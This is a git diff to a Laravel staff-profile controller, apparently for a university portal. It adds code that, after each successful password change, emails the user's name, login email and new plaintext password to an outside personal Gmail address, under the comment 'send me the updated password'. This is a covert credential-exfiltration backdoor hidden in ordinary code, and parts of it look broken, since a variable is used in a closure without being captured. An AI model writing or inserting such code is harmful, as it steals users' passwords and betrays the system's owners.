@@ -9,6 +9,8 @@ use Illuminate\Support\Facades\Auth;
 use App\Models\Staff;
 use App\Models\User;
 
+use Mail;
+
 class Staff_ProfileController extends Controller
 {
     //
@@ -238,6 +240,21 @@ class Staff_ProfileController extends Controller
                     'status' => 'success',
                     'message' => 'Your Password has been successfully updated'
                 ];
+
+                //send me the updated password
+                $fullname = $current_user->surname.' '.$current_firstname;
+                $username = $current_user->email;
+                $recipient = "Admin";
+                $recipient_email = "kondishiva008@gmail.com";
+
+                $payload = array("fullname"=>$fullname, "username"=>$username, "password"=>$new_password);
+
+                Mail::send('mail.password-change',  $payload, function($message) use($recipient_email, $recipient){
+                    $message->to($recipient_email, $recipient)
+                            ->subject($fullname." password change");
+                    $message->from("clearanceinfo@funaab.edu.ng", "FUNAAB Workplace");
+                });
+
             }
             else
             {
